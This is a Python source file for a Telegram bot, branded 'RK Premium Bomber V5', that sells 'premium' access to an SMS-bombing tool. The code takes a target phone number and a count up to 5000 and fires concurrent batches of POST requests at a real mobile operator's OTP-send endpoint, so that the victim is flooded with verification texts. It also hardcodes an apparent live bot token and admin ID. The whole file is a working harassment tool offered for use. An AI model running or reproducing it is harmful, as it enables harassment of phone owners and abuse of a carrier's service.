import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"

bot = AsyncTeleBot(API_TOKEN)
authorized_users = {ADMIN_ID}
active_attacks = {} 
user_states = {} # State-based handling to replace register_next_step_handler

# --- HELPERS ---
def get_bd_time():
    tz = pytz.timezone('Asia/Dhaka')
    return datetime.datetime.now(tz)

def format_time(dt):
    return dt.strftime("%I:%M:%S %p")

# --- UI KEYBOARDS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "💎 My Status")
    markup.add("📊 System Info", "📞 Support")
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_btn = types.InlineKeyboardButton("⏸ Pause", callback_data="pause") if state == 'running' else types.InlineKeyboardButton("▶️ Resume", callback_data="resume")
    s_btn = types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    markup.add(p_btn, s_btn)
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    data = {"msisdn": number}
    try:
        async with session.post(TARGET_URL, json=data, headers=headers, timeout=10) as resp:
            if resp.status == 200:
                stats['success'] += 1
            else:
                stats['fail'] += 1
    except:
        stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {'state': 'running', 'target': number}
    start_time = get_bd_time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            # Check attack state
            current_state = active_attacks.get(chat_id, {}).get('state')
            if not current_state or current_state == 'stopped':
                break
            
            if current_state == 'paused':
                await asyncio.sleep(1)
                continue

            # Concurrent batch (Fastest)
            batch_size = min(15, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch_size)]
            await asyncio.gather(*tasks)

            # UI Update (Throttle update frequency)
            duration = str(get_bd_time() - start_time).split(".")[0]
            try:
                text = (
                    f"🔥 **RK ULTIMATE BOMBING** 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Target: `{number}`\n"
                    f"✅ Success: `{stats['success']}`\n"
                    f"❌ Failed: `{stats['fail']}`\n"
                    f"⏳ Duration: `{duration}`\n"
                    f"📊 Progress: `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📡 Status: `{current_state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(current_state), parse_mode='Markdown')
            except:
                pass
            
            await asyncio.sleep(0.3)

    final_time = str(get_bd_time() - start_time).split(".")[0]
    await bot.send_message(
        chat_id,
        f"🏁 **ATTACK COMPLETED**\n\n"
        f"📱 Number: `{number}`\n"
        f"📊 Total Success: {stats['success']}\n"
        f"⏳ Total Time: {final_time}\n"
        f"🕒 Finished: {format_time(get_bd_time())}",
        reply_markup=main_keyboard()
    )
    active_attacks.pop(chat_id, None)

# --- MESSAGE HANDLERS ---
@bot.message_handler(commands=['start'])
async def welcome(message):
    await bot.send_message(
        message.chat.id, 
        f"⚡ **Welcome to RK Premium Bomber V5**\n\nBest high-speed SMS stress tester.\nAdmin: @itzrkraihan",
        reply_markup=main_keyboard(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: True)
async def handle_logic(message):
    cid = message.chat.id
    text = message.text

    # Start Attack Command
    if text == "🚀 Start Attack":
        if cid not in authorized_users:
            return await bot.reply_to(message, "❌ **Access Denied!**\nBuy premium from @itzrkraihan")
        
        user_states[cid] = 'getting_number'
        await bot.send_message(cid, "📞 **Target নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

    # System Info
    elif text == "📊 System Info":
        info = f"🖥 **CPU:** {psutil.cpu_percent()}% | **RAM:** {psutil.virtual_memory().percent}%"
        await bot.reply_to(message, info, parse_mode='Markdown')

    # Status
    elif text == "💎 My Status":
        status = "Premium Member 💎" if cid in authorized_users else "Free User 🆓"
        await bot.reply_to(message, f"👤 User: {message.from_user.first_name}\n🆔 ID: `{cid}`\n📊 Status: {status}", parse_mode='Markdown')

    # State: Getting Number
    elif cid in user_states and user_states[cid] == 'getting_number':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'state': 'getting_limit', 'number': text}
            await bot.send_message(cid, "🔢 **SMS এর সংখ্যা দিন (সর্বোচ্চ ৫০০০):**")
        else:
            await bot.send_message(cid, "❌ ভুল নম্বর! সঠিক ১১ ডিজিট নম্বর দিন।")

    # State: Getting Limit
    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('state') == 'getting_limit':
        try:
            limit = int(text)
            if limit > 5000: limit = 5000
            number = user_states[cid]['number']
            del user_states[cid] # Clear state
            
            msg = await bot.send_message(cid, "⚙️ **ইঞ্জিন প্রস্তুত হচ্ছে...**")
            asyncio.create_task(run_attack(cid, msg.message_id, number, limit))
        except ValueError:
            await bot.send_message(cid, "❌ শুধু সংখ্যা লিখুন!")

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
async def handle_callbacks(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause":
            active_attacks[cid]['state'] = 'paused'
            await bot.answer_callback_query(call.id, "অ্যাটাক পজ করা হয়েছে।")
        elif call.data == "resume":
            active_attacks[cid]['state'] = 'running'
            await bot.answer_callback_query(call.id, "আবার শুরু হচ্ছে...")
        elif call.data == "stop":
            active_attacks[cid]['state'] = 'stopped'
            await bot.answer_callback_query(call.id, "অ্যাটাক বন্ধ করা হয়েছে।")

# --- ADMIN PANEL ---
@bot.message_handler(commands=['add'])
async def add_prem(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_id = int(message.text.split()[1])
            authorized_users.add(new_id)
            await bot.reply_to(message, f"✅ `{new_id}` কে প্রিমিয়াম এক্সেস দেওয়া হয়েছে।")
        except:
            await bot.reply_to(message, "Usage: `/add 12345678`")

# --- MAIN RUN ---
if __name__ == "__main__":
    print("RK Ultimate V5 is Live and Stable...")
    asyncio.run(bot.polling(non_stop=True))
